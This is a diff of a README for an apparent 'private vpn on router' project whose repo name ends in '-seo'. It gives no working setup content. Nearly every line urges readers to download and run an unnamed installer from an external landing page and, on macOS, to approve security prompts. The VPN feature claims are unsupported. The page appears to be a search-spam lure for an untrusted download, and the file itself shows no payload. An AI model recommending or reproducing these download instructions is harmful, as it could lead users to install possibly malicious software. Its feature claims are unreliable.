@@ -1,91 +1,95 @@
 # ⚡ private vpn on router
 
-[![Download](https://img.shields.io/badge/Download-Get%20Build-blue?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
-[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20build-blue?style=for-the-badge&logo=download)](https://spainharley.github.io/private-vpn-on-router-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111?style=for-the-badge&logo=linux)](https://spainharley.github.io/private-vpn-on-router-landing/)
+[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=open-source-initiative)](https://github.com/spainharley/private-vpn-on-router-seo)
 
 ## About
 
-**private vpn on router** is a practical setup path for running a **private vpn** at the router level so every device on your network inherits protection—TVs, consoles, phones, guests, and anything that can’t run a VPN app.
+**private vpn on router** is a focused setup flow for running a private VPN connection at the router level, so every device on your network routes through the tunnel by default. It’s built for people who care about **privacy and security focus** and don’t want to install a VPN app on every phone, TV, console, and laptop.
 
-This repo documents the workflow and points to the installer bundle and config pack. Source and release notes live here:  
-https://github.com/spainharley/private-vpn-on-router-seo
+This repo documents the setup and links to the official landing page for downloads and updates:  
+- Repo: https://github.com/spainharley/private-vpn-on-router-seo  
+- Landing: https://spainharley.github.io/private-vpn-on-router-landing/
 
 ## Features
 
-- **AES-256 encryption** end-to-end tunnel configuration
-- **No-Logs policy** posture: privacy-first defaults and minimal telemetry assumptions
-- **Kill Switch** guidance for router + client fail-closed behavior
-- **Global Servers** profiles for region switching without rewiring your network
-- **High speed** routing tips (CPU, ciphers, MTU) to avoid slowdowns
-- **Stable connection** keepalive + reconnect strategy for long-running links
-- **Privacy and security focus**: DNS handling and leak-reduction checklist
+- **AES-256 encryption** for tunnel traffic
+- **No-Logs policy** (designed around privacy-first usage expectations)
+- **Kill Switch** support (prevents traffic leaks on drop)
+- **Global Servers** selection for routing and location needs
+- **High speed** routing with low overhead
+- **Stable connection** behavior tuned for always-on router sessions
+- Router-first approach: protect **all** devices behind the gateway
+- Clear config flow: credentials, server pick, and verification steps
 
 ## System Requirements
 
-| Item | Requirement |
+| Component | Requirement |
 |---|---|
-| Windows | Windows 10/11 (admin access) |
-| macOS | macOS 12+ (admin access) |
-| Linux | Ubuntu/Debian/Fedora (root or sudo) |
-| RAM | 2 GB+ (4 GB recommended) |
+| Windows | Windows 10/11 (for setup tools + verification) |
+| macOS | macOS 12+ (for setup tools + verification) |
+| Linux | Ubuntu 20.04+/Fedora/Debian (for setup tools + verification) |
+| RAM | 2 GB minimum (4 GB recommended) |
 | Storage | 200 MB free |
-| Internet | Stable broadband; router with VPN client support (or compatible firmware) |
+| Internet | Stable connection; router must support VPN client mode or custom firmware |
 
 ## Installation
 
-> All downloads and the latest setup package are published here:  
-> https://spainharley.github.io/private-vpn-on-router-landing/
+> You’ll download the package/tools and follow the router-specific steps on the landing page. Use the OS steps below to install and verify locally.
 
 ### Windows
-1. Download the package from the landing page.
-2. Run the installer as Administrator.
-3. Import the router profile/config from the bundle.
-4. Apply DNS + Kill Switch options, then connect.
+1. Open the download page: https://spainharley.github.io/private-vpn-on-router-landing/
+2. Download the Windows build/tools.
+3. Run the installer.
+4. Follow the router section to apply the VPN profile.
+5. Verify: confirm your public IP/location changes after the router connects.
 
 ### macOS
-1. Download the macOS build from the landing page.
-2. Install and allow required network permissions when prompted.
-3. Import the router profile/config.
-4. Connect and verify IP/DNS from a browser test page.
+1. Go to: https://spainharley.github.io/private-vpn-on-router-landing/
+2. Download the macOS build/tools.
+3. Install and allow any required security prompts (System Settings → Privacy & Security).
+4. Apply the router configuration from the landing instructions.
+5. Verify: test DNS/IP after the router tunnel is active.
 
 ### Linux
-1. Download the Linux bundle from the landing page.
-2. Extract and install the included client/tools.
-3. Import the provided config profile.
-4. Start the service and confirm the tunnel stays up after reboot.
+1. Visit: https://spainharley.github.io/private-vpn-on-router-landing/
+2. Download the Linux build/tools.
+3. Install using the provided package steps on the landing page.
+4. Configure the router client settings as described.
+5. Verify: check IP/DNS from a device behind the router.
 
 ## Comparison
 
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
 | **private vpn on router** | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low–Medium | ❓ | ❌ | ❌ | ❌/Limited |
-| Per-device VPN only | Medium–High | ✅ | ✅/Varies | ✅ | ✅ |
+| Typical free VPN app | Low–Medium | ❌/Varies | ❌/Varies | ❌ | ❌/Limited |
+| Per-device VPN only | Medium–High | ✅/Varies | ✅/Varies | ✅/Varies | ✅/Varies |
 
 ## FAQ
 
-**Q: Does “private vpn on router” protect devices that can’t install apps (TV/console/IoT)?**  
-A: Yes. Router-level VPN covers everything behind the router.
+**Does this protect every device on my network?**  
+Yes. Once the router is connected, devices behind it use the VPN tunnel by default.
 
-**Q: Will a router VPN slow my network down?**  
-A: It depends on router CPU and settings. Use supported ciphers, avoid double NAT, and pick nearby Global Servers for best speed.
+**Will this slow down my connection?**  
+Some overhead is normal, but the goal is **high speed** with a **stable connection**. Your router CPU and chosen server matter.
 
-**Q: Can I keep local LAN access (printers/NAS) while using the VPN?**  
-A: Yes. Configure split routing or local subnet exceptions in the router profile.
+**What happens if the VPN drops?**  
+With **Kill Switch** enabled, traffic won’t leak outside the tunnel during a disconnect.
 
-**Q: What happens if the VPN drops?**  
-A: Use the Kill Switch guidance so traffic fails closed instead of leaking outside the tunnel.
+**Can I choose different countries/regions?**  
+Yes. **Global Servers** are available—pick the location you need during setup.
 
 ## Download
 
-Get the latest build, router profiles, and setup notes here:  
+Get the latest build and the router setup flow here:  
 **https://spainharley.github.io/private-vpn-on-router-landing/**
 
 ## Final CTA
 
-[![Download Now](https://img.shields.io/badge/Download-Private%20VPN%20On%20Router-blue?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
-[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-2ea44f?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
-[![Repository](https://img.shields.io/badge/Repo-private--vpn--on--router--seo-black?style=for-the-badge)](https://github.com/spainharley/private-vpn-on-router-seo)
+[![Download Now](https://img.shields.io/badge/Download-Private%20VPN%20on%20Router-blue?style=for-the-badge&logo=download)](https://spainharley.github.io/private-vpn-on-router-landing/)
+[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-111?style=for-the-badge&logo=githubpages)](https://spainharley.github.io/private-vpn-on-router-landing/)
+[![View Repo](https://img.shields.io/badge/View-Repository-green?style=for-the-badge&logo=github)](https://github.com/spainharley/private-vpn-on-router-seo)
 
-*Private network by default. Route it once. Protect everything.*
+*Keep your network private: set it once on the router, and stop chasing device-by-device installs.*
